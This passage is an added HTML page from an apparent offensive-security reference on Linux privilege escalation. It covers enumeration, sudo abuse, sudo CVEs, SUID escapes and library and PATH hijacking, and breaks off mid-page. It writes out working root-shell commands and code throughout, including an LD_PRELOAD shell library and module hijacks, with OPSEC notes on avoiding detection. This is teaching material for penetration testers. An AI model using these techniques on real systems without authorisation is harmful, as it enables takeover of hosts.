@@ -1,0 +1,791 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Linux Privilege Escalation | HackGraph Reference</title>
+<meta name="description" content="Linux Privilege Escalation: From an unprivileged shell to root: sudo abuse and GTFOBins, SUID/SGID and capabilities, cron and systemd jobs, writable files, credential hunting, privileged groups and container escapes, and kernel exploits."/>
+<meta name="keywords" content="cybersecurity, offensive security, penetration testing, red team, OSCP notes, OSEP, CRTP, PNPT, CTF, privilege escalation, Active Directory, Windows privilege escalation, Linux privilege escalation, Kerberoasting, NTLM relay, AD CS ESC1, pass-the-hash, DCSync, ethical hacking, attack path, pentest cheat sheet"/>
+<link rel="canonical" href="https://hackgraph.github.io/reference/linux-privilege-escalation.html"/>
+<meta name="robots" content="index, follow, max-image-preview:large"/>
+<link rel="icon" type="image/svg+xml" href="/favicon.svg"/>
+<meta name="theme-color" content="#0c0a0b"/>
+<meta property="og:type" content="article"/>
+<meta property="og:site_name" content="HackGraph"/>
+<meta property="og:title" content="Linux Privilege Escalation | HackGraph Reference"/>
+<meta property="og:description" content="Linux Privilege Escalation: From an unprivileged shell to root: sudo abuse and GTFOBins, SUID/SGID and capabilities, cron and systemd jobs, writable files, credential hunting, privileged groups and container escapes, and kernel exploits."/>
+<meta property="og:url" content="https://hackgraph.github.io/reference/linux-privilege-escalation.html"/>
+<meta property="og:image" content="https://hackgraph.github.io/og-image.png"/>
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hackgraph.github.io/og-image.png"/>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Linux Privilege Escalation","name":"Linux Privilege Escalation | HackGraph Reference","url":"https://hackgraph.github.io/reference/linux-privilege-escalation.html","description":"Linux Privilege Escalation: From an unprivileged shell to root: sudo abuse and GTFOBins, SUID/SGID and capabilities, cron and systemd jobs, writable files, credential hunting, privileged groups and container escapes, and kernel exploits.","inLanguage":"en","author":{"@type":"Organization","name":"HackGraph"},"publisher":{"@type":"Organization","name":"HackGraph"},"isPartOf":{"@type":"WebSite","name":"HackGraph","url":"https://hackgraph.github.io/"}}</script>
+<style>
+:root{--bg:#0c0a0b;--panel:#160f11;--ink:#f0eaec;--dim:#a59699;--faint:#8a7d80;--accent:#f04450;--border:rgba(214,168,172,.13)}
+@font-face{font-family:'Geist';font-weight:400;font-display:swap;src:url('/fonts/geist-sans-latin-400-normal.woff2') format('woff2')}
+@font-face{font-family:'Geist';font-weight:600;font-display:swap;src:url('/fonts/geist-sans-latin-600-normal.woff2') format('woff2')}
+@font-face{font-family:'Geist Mono';font-weight:400;font-display:swap;src:url('/fonts/geist-mono-latin-400-normal.woff2') format('woff2')}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:'Geist',system-ui,-apple-system,sans-serif;line-height:1.6;letter-spacing:-.01em;-webkit-font-smoothing:antialiased}
+a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}
+header.top{border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;gap:12px;position:sticky;top:0;background:rgba(12,10,11,.85);backdrop-filter:blur(10px)}
+header.top .name{font-weight:600;font-size:17px}
+header.top .cta{margin-left:auto;font-size:14px;color:var(--dim)}
+main{max-width:860px;margin:0 auto;padding:40px 24px 96px}
+h1{font-size:30px;font-weight:600;line-height:1.2;margin:0 0 14px}
+.lead{color:var(--dim);font-size:17px;margin:0 0 10px}
+.toc{margin:20px 0 8px;padding:0;list-style:none;display:flex;flex-wrap:wrap;gap:10px}
+.toc a{border:1px solid var(--border);border-radius:999px;padding:5px 12px;font-size:13px;color:var(--ink)}
+section.phase{margin-top:44px}
+h2.phase-h{font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:.09em;padding-bottom:6px;border-bottom:1px solid var(--border)}
+article{padding:18px 0;border-bottom:1px solid var(--border)}
+article h3{font-size:19px;font-weight:600;margin:0 0 4px;scroll-margin-top:70px}
+.kind{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--faint);font-weight:600}
+.summary{color:var(--ink);margin:6px 0}
+.desc{color:var(--dim);margin:8px 0}
+.meta{color:var(--faint);font-size:13px}
+h4{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--faint);margin:16px 0 6px}
+ul.req{margin:4px 0;padding-left:18px;color:var(--dim);font-size:14px}
+pre{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:12px 14px;overflow:auto;margin:6px 0}
+code{font-family:'Geist Mono',ui-monospace,Menlo,monospace;font-size:13px;color:#e7dfe1}
+pre .cmt{color:var(--faint)}
+ul.links{margin:4px 0;padding-left:18px;font-size:14px}
+.opsec{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:10px 14px;margin:12px 0;color:var(--dim);font-size:14px}
+.opsec b{color:var(--ink)}
+footer{max-width:860px;margin:0 auto;padding:32px 24px 64px;color:var(--faint);font-size:14px;border-top:1px solid var(--border)}
+</style>
+</head>
+<body>
+<header class="top"><a href="/" style="display:flex;align-items:center;gap:10px;color:var(--ink)"><svg viewBox="0 0 24 24" width="26" height="26" fill="none" aria-hidden="true"><path d="M9.5 12 H11.5 V5.5 H13.5 M11.5 12 V18.5 H13.5" stroke="#a59699" stroke-width="1.8" stroke-linejoin="round"/><rect x="1" y="8.5" width="8.5" height="7" rx="2.2" fill="#f0eaec"/><rect x="13.5" y="2" width="8.5" height="7" rx="2.2" fill="#a59699"/><rect x="13.5" y="15" width="8.5" height="7" rx="2.2" fill="#f04450"/></svg><span class="name">HackGraph</span></a><a class="cta" href="/">Open the interactive graph &rarr;</a></header>
+<main>
+<h1>Linux Privilege Escalation</h1>
+<p class="lead">From an unprivileged shell to root: sudo abuse and GTFOBins, SUID/SGID and capabilities, cron and systemd jobs, writable files, credential hunting, privileged groups and container escapes, and kernel exploits.</p>
+<p class="meta">47 techniques and steps. <a href="/">Explore this map interactively &rarr;</a></p>
+<ul class="toc"><li><a href="#ph-triage">Triage</a></li><li><a href="#ph-sudo">Sudo Abuse</a></li><li><a href="#ph-suid">SUID / Capabilities</a></li><li><a href="#ph-jobs">Jobs &amp; Services</a></li><li><a href="#ph-creds">Credentials</a></li><li><a href="#ph-files">Files &amp; Shares</a></li><li><a href="#ph-containers">Groups &amp; Containers</a></li><li><a href="#ph-kernel">Kernel &amp; Libraries</a></li><li><a href="#ph-root">root</a></li></ul>
+<section class="phase" id="ph-triage"><h2 class="phase-h" style="color:oklch(0.70 0.13 248)">Triage</h2><article id="lin-start">
+<h3><span class="kind">start</span> Get a Foothold</h3>
+<p class="summary">An unprivileged shell on a Linux host. Make it usable, then enumerate.</p>
+<p class="desc">You have command execution as a low-privilege user (a service account, a web user, or a normal login) on a Linux host, and the goal is root (EUID 0). Before any exploit, make the shell usable and build situational awareness: who you are, what the kernel and distro are, and what the host is misconfigured to let you touch. Almost every path to root here is a misconfiguration you have to find, so enumeration is the first move, not exploitation.</p>
+<h4>Requires</h4><ul class="req"><li>A low-privilege shell on a Linux host</li></ul>
+<h4>References</h4><ul class="links"><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" rel="noopener nofollow">PayloadsAllTheThings, Linux Privilege Escalation</a></li></ul>
+</article>
+<article id="lin-stabilize">
+<h3>Stabilize the Shell</h3>
+<p class="summary">Upgrade a raw reverse shell to a PTY; break out of a restricted shell.</p>
+<p class="desc">A raw reverse or web shell has no job control, no tab-completion, and dies on Ctrl-C, and su/sudo/ssh refuse to run without a real terminal. Spawn a pseudo-terminal (pty) so the session behaves like a normal login. If you landed in a restricted shell (rbash, lshell, or a constrained interpreter), escape it first: many editors, pagers, and language REPLs launched inside it can spawn an unrestricted /bin/bash.</p>
+<h4>Requires</h4><ul class="req"><li>A non-interactive shell or a restricted shell on the host</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Spawn a PTY (Python)</span>
+python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></pre>
+<pre><code><span class="cmt"># Then background and fix the terminal</span>
+# Ctrl-Z, then on the attacker box:
+stty raw -echo; fg
+# in the shell:
+export TERM=xterm; stty rows 40 columns 160</code></pre>
+<pre><code><span class="cmt"># Escape a restricted shell (rbash)</span>
+# via an allowed binary that shells out, e.g.:
+vi -c ':!/bin/bash'      # or: awk 'BEGIN{system(&quot;/bin/bash&quot;)}'</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1059/004/" rel="noopener nofollow">T1059.004</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1059/004/" rel="noopener nofollow">MITRE ATT&amp;CK, Unix Shell (T1059.004)</a></li><li><a href="https://gtfobins.github.io/" rel="noopener nofollow">GTFOBins</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Upgrading the shell is local and quiet: pty.spawn() itself writes no utmp/wtmp login record. The wtmp/lastlog footprint comes from the original login (sshd, the web-shell parent, etc.), not from the pty upgrade. Tools that do log (script, screen, tmux, ssh) will add records.</p>
+</article>
+<article id="lin-enum">
+<h3>Enumerate &amp; Triage</h3>
+<p class="summary">Sweep the host for the misconfiguration that leads to root, then pick a lane.</p>
+<p class="desc">Almost every path to root on Linux is a misconfiguration you have to find first, so enumeration is most of the work. Identify the kernel and distro version, your user and groups, sudo rights, SUID/SGID binaries, scheduled jobs, writable files, listening services, and stored secrets. Run the quick wins by hand first (sudo -l, SUID scan, cron, histories), then let an automated script sweep the rest and watch running processes for jobs that fire as root. What you find decides which escalation technique applies.</p>
+<h4>Requires</h4><ul class="req"><li>An interactive shell on the host</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Identity, kernel, distro</span>
+id; uname -a; cat /etc/os-release</code></pre>
+<pre><code><span class="cmt"># Quick wins: sudo, SUID, cron</span>
+sudo -l 2&gt;/dev/null
+find / -perm -4000 -type f 2&gt;/dev/null
+cat /etc/crontab; ls -la /etc/cron.*</code></pre>
+<pre><code><span class="cmt"># Capabilities and writable files</span>
+getcap -r / 2&gt;/dev/null
+find / -writable -type f 2&gt;/dev/null | grep -vE '^/(proc|sys)'</code></pre>
+<pre><code><span class="cmt"># Automated sweep + process watch</span>
+./linpeas.sh          # broad checks
+./pspy64              # watch cron/root jobs fire in real time</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/peass-ng/PEASS-ng" rel="noopener nofollow">LinPEAS (PEASS-ng)</a></li><li><a href="https://github.com/DominicBreuker/pspy" rel="noopener nofollow">pspy</a></li><li><a href="https://github.com/rebootuser/LinEnum" rel="noopener nofollow">LinEnum</a></li><li><a href="https://gtfobins.github.io/" rel="noopener nofollow">GTFOBins</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1082/" rel="noopener nofollow">T1082</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1082/" rel="noopener nofollow">MITRE ATT&amp;CK, System Information Discovery (T1082)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">PayloadsAllTheThings, Linux Privilege Escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> LinPEAS is loud: it touches thousands of files and is trivially fingerprinted by EDR/auditd. On a monitored host prefer the targeted manual checks and a static pspy binary over dropping a full enumeration script.</p>
+</article>
+<article id="lin-identity">
+<h3>Identity &amp; Entitlements</h3>
+<p class="summary">What your identity already holds: sudo rights and privileged group membership.</p>
+<p class="desc">Check what your identity already confers before you go hunting for a misconfiguration. These are the fastest wins on Linux, the same as a Windows token or group you already hold. sudo -l lists any sudo rights, often a one-step path to root. id and groups show privileged group membership: docker and lxd are effectively root, disk reads the raw block device, adm reads logs, shadow reads /etc/shadow. A service or web account (www-data) usually holds none of these and falls through to the misconfiguration techniques. Windows branches on who you are; Linux branches on what is misconfigured.</p>
+<h4>Requires</h4><ul class="req"><li>An interactive shell on the host</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Sudo rights (fast path, but may prompt for the account password)</span>
+sudo -l   # yields nothing on a passwordless service-account shell</code></pre>
+<pre><code><span class="cmt"># Your user, groups, and any privileged membership</span>
+id; groups</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1033/" rel="noopener nofollow">T1033</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1033/" rel="noopener nofollow">MITRE ATT&amp;CK, System Owner/User Discovery (T1033)</a></li><li><a href="https://hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Linux Privilege Escalation</a></li></ul>
+</article>
+<article id="lin-hostcontrols">
+<h3>Host Controls &amp; Confinement</h3>
+<p class="summary">Confinement and logging that blocks or catches escalation tricks, the Linux analog of AMSI/EDR.</p>
+<p class="desc">A hardened Linux host constrains what your escalation attempts can do and logs them, so check before assuming a technique will work. SELinux or AppArmor confinement can deny an action even for a root-equivalent process. Mount options matter most: nosuid neuters SUID and setuid-shell tricks, and noexec blocks running a dropped binary, so /tmp, /dev/shm, and /home are common blockers (this is why the cron-wildcard setuid trick can be inert). auditd or an eBPF-based EDR logs execve and file writes. This constrains which techniques work rather than giving a path to root, like the Windows Defense Evasion checks.</p>
+<h4>Requires</h4><ul class="req"><li>An interactive shell on the host</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confinement + mount restrictions</span>
+id -Z 2&gt;/dev/null; aa-status 2&gt;/dev/null    # SELinux / AppArmor (full aa-status needs root)
+cat /proc/self/attr/current 2&gt;/dev/null      # unprivileged: this shell's AppArmor label
+mount | grep -E 'nosuid|noexec'              # where SUID / exec is blocked</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1518/001/" rel="noopener nofollow">T1518.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1518/001/" rel="noopener nofollow">MITRE ATT&amp;CK, Security Software Discovery (T1518.001)</a></li></ul>
+</article></section>
+<section class="phase" id="ph-sudo"><h2 class="phase-h" style="color:oklch(0.70 0.13 55)">Sudo Abuse</h2><article id="lin-cat-sudo">
+<h3><span class="kind">category</span> Sudo Abuse</h3>
+<p class="summary">Turn a sudo right or a sudo bug into a root shell.</p>
+<p class="desc">The most common Linux privesc. sudo -l reveals commands you may run as root and the environment variables sudo preserves (env_keep in the matching Defaults); sudo -V shows the version, which you compare against known-vulnerable ranges. A permissive rule, a shell-spawning binary, LD_PRELOAD, argument injection, or a sudo CVE each gets you a root shell.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/003/" rel="noopener nofollow">T1548.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://gtfobins.github.io/#+sudo" rel="noopener nofollow">GTFOBins, Sudo</a></li></ul>
+</article>
+<article id="lin-sudo-gtfobins">
+<h3>Sudo Rule / GTFOBins</h3>
+<p class="summary">sudo -l shows ALL, a shell, or a binary with a documented shell escape.</p>
+<p class="desc">Read your sudo entitlements with sudo -l. An unrestricted rule (ALL) or a permitted shell hands you root immediately. Otherwise, most allowed binaries can be steered into spawning a shell, reading a file, or writing one as root: GTFOBins catalogs the exact escape for each (a pager that shells out, an editor, an interpreter, tar/find with an exec option). NOPASSWD rules mean no credential is even needed.</p>
+<h4>Requires</h4><ul class="req"><li>A sudoers rule granting you one or more commands as root (with or without NOPASSWD)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># List your sudo rights</span>
+sudo -l</code></pre>
+<pre><code><span class="cmt"># Unrestricted rule or a shell</span>
+sudo su -        # or: sudo /bin/bash</code></pre>
+<pre><code><span class="cmt"># Shell escape via an allowed binary (GTFOBins)</span>
+sudo find . -exec /bin/sh \; -quit
+sudo less /etc/profile   # then: !/bin/sh
+sudo awk 'BEGIN{system(&quot;/bin/sh&quot;)}'</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://gtfobins.github.io/" rel="noopener nofollow">GTFOBins</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/003/" rel="noopener nofollow">T1548.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1548/003/" rel="noopener nofollow">MITRE ATT&amp;CK, Sudo and Sudo Caching (T1548.003)</a></li><li><a href="https://gtfobins.github.io/#+sudo" rel="noopener nofollow">GTFOBins, Sudo</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> sudo invocations are logged to the auth log / journal with the exact command; a shell escape from an odd binary stands out in review. sudo -l is itself logged to syslog/auth.log by default via the sudoers plugin (COMMAND=list), with no auditd required; auditd only adds a separate, harder-to-tamper record.</p>
+</article>
+<article id="lin-sudo-env">
+<h3>Environment Injection (LD_PRELOAD)</h3>
+<p class="summary">A sudo rule preserves the environment; steer the loader to run your code as root.</p>
+<p class="desc">When a sudoers rule keeps environment variables (env_keep with LD_PRELOAD or LD_LIBRARY_PATH, or env_reset disabled), you control how the elevated command loads code. Point LD_PRELOAD at a small shared object whose constructor spawns a root shell, or point LD_LIBRARY_PATH at a directory holding a malicious copy of a library the command needs. The binary runs as root and loads your library first.</p>
+<h4>Requires</h4><ul class="req"><li>A sudo rule that preserves LD_PRELOAD / LD_LIBRARY_PATH (env_keep) or does not reset the environment</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm the env is preserved</span>
+sudo -l    # look for env_keep+=LD_PRELOAD or missing env_reset</code></pre>
+<pre><code><span class="cmt"># Build a preload shell</span>
+cat &gt; /tmp/x.c &lt;&lt;'EOF'
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__((constructor)) void init(){setuid(0);system(&quot;/bin/bash&quot;);}
+EOF
+gcc -shared -fPIC -nostartfiles /tmp/x.c -o /tmp/x.so</code></pre>
+<pre><code><span class="cmt"># Trigger via the allowed sudo command</span>
+sudo LD_PRELOAD=/tmp/x.so &lt;allowed-command&gt;</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/006/" rel="noopener nofollow">T1574.006</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1574/006/" rel="noopener nofollow">MITRE ATT&amp;CK, Dynamic Linker Hijacking (T1574.006)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation (LD_PRELOAD)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The sudo command is still logged; the preload library on disk is the artifact. glibc ignores LD_PRELOAD for plain setuid binaries, so this depends on the sudoers env policy, not on the target being setuid.</p>
+</article>
+<article id="lin-sudo-argwild">
+<h3>Argument &amp; Wildcard Injection</h3>
+<p class="summary">A rule looks constrained but a binary flag, wrapper, or wildcard breaks out.</p>
+<p class="desc">A sudo rule that pins a specific binary or wrapper often still lets you smuggle in behaviour. Many tools have a flag that shells out or writes arbitrary files (an editor invoked from a --exec, a checkpoint action, a config-file override). sudoedit and wrappers that pass your arguments to another program are classic footguns. Where a rule allows a command with a wildcard, extra crafted filenames become option arguments.</p>
+<h4>Requires</h4><ul class="req"><li>A sudo rule pinning a binary/wrapper that accepts an argument or wildcard you can influence</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Break out via a tool flag (GTFOBins)</span>
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+sudo git help config    # then type: !/bin/sh   (opens the man pager / less)</code></pre>
+<pre><code><span class="cmt"># Inject options through a wildcard</span>
+# rule: (root) /usr/bin/somejob *  -&gt; plant files whose names are flags
+touch -- '--some-dangerous-flag'</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://gtfobins.org/" rel="noopener nofollow">GTFOBins</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/003/" rel="noopener nofollow">T1548.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1548/003/" rel="noopener nofollow">MITRE ATT&amp;CK, Sudo and Sudo Caching (T1548.003)</a></li><li><a href="https://gtfobins.org/" rel="noopener nofollow">GTFOBins</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The elevated command and its arguments are logged, so an injected flag or a shell-out is visible to anyone reviewing sudo logs.</p>
+</article>
+<article id="lin-sudo-cve">
+<h3>Sudo CVEs</h3>
+<p class="summary">Exploit a flaw in sudo itself: Baron Samedit, Runas bypass, sudoedit, host/chroot.</p>
+<p class="desc">Check sudo -V against the known-vulnerable ranges. Baron Samedit (CVE-2021-3156) is a heap overflow reachable by any local user with no sudo rights at all. CVE-2019-14287 bypasses a Runas rule written as (ALL, !root) by passing user -1. CVE-2023-22809 abuses sudoedit EDITOR handling to edit arbitrary files. The 2025 pair widens reach: CVE-2025-32462 (the -h/--host option leaking into execution) and CVE-2025-32463 (the --chroot option loading an attacker /etc/nsswitch.conf); CVE-2025-32463 is in the CISA KEV catalog (confirmed actively exploited), CVE-2025-32462 is not.</p>
+<h4>Requires</h4><ul class="req"><li>A locally installed sudo version within a vulnerable range (some, like Baron Samedit, need no sudo rule)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Check the version first</span>
+sudo -V | head -1</code></pre>
+<pre><code><span class="cmt"># Runas bypass (CVE-2019-14287)</span>
+sudo -u#-1 vi     # rule Runas is (ALL,!root); run a command the rule permits (its command field must be ALL or list that binary)</code></pre>
+<pre><code><span class="cmt"># Probe Baron Samedit (CVE-2021-3156)</span>
+sudoedit -s '\' $(python3 -c 'print(&quot;A&quot;*1000)')   # a crash implies vulnerable</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit" rel="noopener nofollow">Qualys, Baron Samedit (CVE-2021-3156)</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287" rel="noopener nofollow">NVD, CVE-2019-14287 (Runas bypass)</a></li><li><a href="https://www.sudo.ws/security/advisories/minus_1_uid/" rel="noopener nofollow">sudo.ws advisory, CVE-2019-14287 (Runas user restriction bypass)</a></li><li><a href="https://www.sudo.ws/security/advisories/sudoedit_any/" rel="noopener nofollow">sudo.ws advisory, CVE-2023-22809 (sudoedit arbitrary file edit)</a></li><li><a href="https://www.stratascale.com/resource/cve-2025-32462-sudo-host-option-vulnerability/" rel="noopener nofollow">Stratascale, CVE-2025-32462 (sudo host option)</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32463" rel="noopener nofollow">NVD, CVE-2025-32463 (sudo chroot)</a></li><li><a href="https://www.sudo.ws/security/advisories/chroot_bug/" rel="noopener nofollow">sudo.ws advisory, CVE-2025-32463 (LPE via chroot option)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A failed exploit can crash sudo (logged) or leave core dumps. Confirm the version before firing; a memory-corruption PoC against a patched build is noisy and pointless.</p>
+</article></section>
+<section class="phase" id="ph-suid"><h2 class="phase-h" style="color:oklch(0.70 0.13 87)">SUID / Capabilities</h2><article id="lin-cat-suid">
+<h3><span class="kind">category</span> SUID / SGID &amp; Capabilities</h3>
+<p class="summary">Abuse a binary that runs with elevated privilege regardless of the caller.</p>
+<p class="desc">setuid/setgid binaries and file capabilities let a program keep root (or another owner) power no matter who launches it. Abuse a known shell escape, hijack a library or a relatively-named command it loads, use a dangerous capability, or reverse a custom binary for a flaw.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/001/" rel="noopener nofollow">T1548.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://gtfobins.github.io/#+suid" rel="noopener nofollow">GTFOBins, SUID</a></li></ul>
+</article>
+<article id="lin-suid-gtfobins">
+<h3>SUID / SGID GTFOBins</h3>
+<p class="summary">A setuid-root binary has a documented way to spawn a shell or read/write as root.</p>
+<p class="desc">Enumerate every setuid/setgid file, then check each against GTFOBins. A binary carrying the setuid bit and owned by root runs with root effective UID for anyone; if that binary is a shell-spawner, pager, editor, or a tool with an exec/read/write primitive, you inherit root. Some need a small setuid(0) call first because the binary drops privileges, which GTFOBins notes per entry.</p>
+<h4>Requires</h4><ul class="req"><li>A setuid/setgid root binary with a known GTFOBins escape (or a shell-out primitive)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Find SUID/SGID binaries</span>
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2&gt;/dev/null</code></pre>
+<pre><code><span class="cmt"># Escape a SUID binary (GTFOBins examples)</span>
+# e.g. find / bash / env are common:
+./find . -exec /bin/sh -p \; -quit
+/bin/bash -p
+env /bin/sh -p
+# -p is needed only where the shell drops SUID by default; omit it where the shell does not
+# drop it (e.g. /bin/sh is dash on Debian/Ubuntu), or the escape silently fails</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://gtfobins.github.io/" rel="noopener nofollow">GTFOBins</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/001/" rel="noopener nofollow">T1548.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1548/001/" rel="noopener nofollow">MITRE ATT&amp;CK, Setuid and Setgid (T1548.001)</a></li><li><a href="https://gtfobins.github.io/#+suid" rel="noopener nofollow">GTFOBins, SUID</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Running a stock SUID binary is normal; a shell spawned from one with the -p (preserve privileges) flag, or an unexpected child process, is the tell in process telemetry.</p>
+</article>
+<article id="lin-suid-library">
+<h3>Shared-Object / Library Injection</h3>
+<p class="summary">A privileged binary loads a library or module from a path or name you control.</p>
+<p class="desc">A setuid or root-run program resolves shared objects at runtime. If it dlopen()s a library from a writable directory, honours an unsanitised RUNPATH, or an interpreter it runs imports a module from a writable path (a writable entry on Python sys.path, a PERL5LIB, a writable .so it expects), plant a malicious library whose constructor runs your code as root. Run ltrace/strace to see which files it tries to open and where.</p>
+<h4>Requires</h4><ul class="req"><li>A privileged binary that loads a shared object or interpreter module from a writable or attacker-influenced path</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># See what libraries it opens</span>
+strace -f -e openat ./target 2&gt;&amp;1 | grep -i '\.so'
+ltrace ./target 2&gt;&amp;1 | head</code></pre>
+<pre><code><span class="cmt"># Plant a constructor .so at the expected path</span>
+cat &gt; x.c &lt;&lt;'EOF'
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__((constructor)) void init(){setuid(0);setgid(0);system(&quot;/bin/bash -p&quot;);}
+EOF
+gcc -shared -fPIC -o /path/it/loads/lib.so x.c</code></pre>
+<pre><code><span class="cmt"># Python module hijack</span>
+# writable dir earlier on sys.path than the real module:
+echo 'import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)' &gt; /writable/on/path/&lt;module&gt;.py</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/006/" rel="noopener nofollow">T1574.006</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1574/006/" rel="noopener nofollow">MITRE ATT&amp;CK, Dynamic Linker Hijacking (T1574.006)</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-41347" rel="noopener nofollow">NVD, CVE-2022-41347 (example: library load hijack)</a></li><li><a href="https://darrenmartynie.wordpress.com/2021/10/25/zimbra-nginx-local-root-exploit/" rel="noopener nofollow">Darren Martyn, Zimbra nginx Local Root Exploit (CVE-2022-41347)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The planted library or module is the on-disk artifact and integrity-monitoring will flag a new .so/.py in a system path. Note on tracing: the kernel drops the setuid bit when you ptrace a setuid binary as non-root, so it runs with your privileges and its privileged library-resolution paths can differ from the real run. Prefer static inspection (ldd, readelf -d, strings) or trace as root; ptrace_scope may block the attach outright.</p>
+</article>
+<article id="lin-suid-path">
+<h3>PATH Hijacking</h3>
+<p class="summary">A privileged binary calls a helper by relative name; front-run it via $PATH.</p>
+<p class="desc">A setuid binary, or a script run as root via sudo or cron, invokes another command without an absolute path (service, cat, ps). The privileged process searches $PATH to resolve it. Prepend a directory you control to $PATH and drop an executable with the helper name, or, where the caller has its own fixed PATH, write into whichever directory on that PATH is writable. Your stand-in runs with the caller privilege.</p>
+<h4>Requires</h4><ul class="req"><li>A root-run binary/script that calls a command by relative name, and control of a directory that resolves first on its PATH</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Spot a relative call in a SUID binary</span>
+strings ./suidbin | grep -E '^[a-zA-Z0-9_.-]+$'   # candidate command names (noisy; cross-check against the observed exec)
+ltrace ./suidbin 2&gt;&amp;1 | grep -i exec</code></pre>
+<pre><code><span class="cmt"># Front-run it</span>
+echo '/bin/bash -p' &gt; /tmp/service &amp;&amp; chmod +x /tmp/service
+export PATH=/tmp:$PATH
+./suidbin</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/007/" rel="noopener nofollow">T1574.007</a></p>
